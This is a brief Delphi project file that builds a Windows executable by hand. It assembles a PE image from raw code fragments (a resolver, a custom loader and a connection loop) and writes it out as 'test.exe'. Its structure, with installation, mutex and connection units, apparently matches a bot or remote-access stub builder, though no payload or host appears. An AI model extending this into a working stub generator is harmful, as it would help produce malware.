program Project1;

uses
  Windows,
  untUtils in 'untUtils.pas',
  untInstallation in 'Functions\untInstallation.pas',
  untLoader in 'Loader\untLoader.pas',
  Sysutils,
  Classes,
  untPE in 'Utils\untPE.pas',
  untConnection in 'Functions\untConnection.pas',
  untMutex in 'Functions\untMutex.pas';

var
  mPE:TPEFile;

procedure BuildSetup();
begin
  mPE := TPEFile.Create;
  mPE.CreatePEBase;

  mPE.AddFunction(@resolver_start, @resolver_end);
  mPE.CustomizeLoader;

  mPE.AddFunction(@ConnectionLoop_CALLER, @ConnectionLoop_END);

  mPE.FixSectionLen();
  mPE.SaveFile('test.exe');
  mPE.Free;
end;

begin
   BuildSetup;
end.
